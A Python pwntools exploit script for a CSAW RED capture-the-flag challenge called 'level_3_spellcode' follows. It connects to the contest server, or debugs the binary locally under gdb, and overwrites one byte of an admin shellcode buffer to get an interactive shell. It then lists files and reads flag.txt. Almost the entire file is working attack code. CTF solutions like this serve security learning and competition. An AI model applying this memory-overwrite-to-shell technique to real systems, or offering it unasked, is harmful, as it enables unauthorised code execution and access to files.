#!/usr/bin/env python3

from pwn import *
import base64

REMOTE = 1

admin_shellcode = b'\x90'*31 + b'\x48\x83\xec\x08\xe9\x0e\xeb\xdf\xff'
print('admin_shellcode:',admin_shellcode)

'''
Goal: Overwrite one byte of admin_shellcode with a non-null byte
      to pop a shell.
'''

offset = [36]
byte = [b'\x50']

assert all([offset[i] < 0x28 and offset[i] > -1 and byte[i] != b'\0' for i in range(len(offset))])

print("Not super reliable; if it hangs just do ^C and try running again\n")

if REMOTE:
    p = remote('pwn.red.csaw.io',5011)
else:
    p = gdb.debug('./level_3_spellcode', gdbscript=(''
        #+'break *0x00400c64\n'#1_Func
        #+'break *0x00400ac8\n'#2_AdminAttack
        #+'break *0x00400b4e\n'#3_runGame
         +'break *0x00400a06\n'#4_UserAttack
         +'break *0x006020c0\n'#5_Payload
        )
        )

print(p.recv())

print('3')
p.sendline(b"3")

print(p.recvuntil(b"write to (0-39): > "))

print(offset[0])
p.sendline(str(offset[0]).encode())

print(p.recv())

print(byte[0])
p.sendline(byte[0])

print(p.recv())

p.interactive()

print('ls')
p.sendline(b'ls')

print(p.recv().decode('ascii'))

p.sendline(b'cat flag.txt')

print(p.recv().decode('ascii'))

p.close()
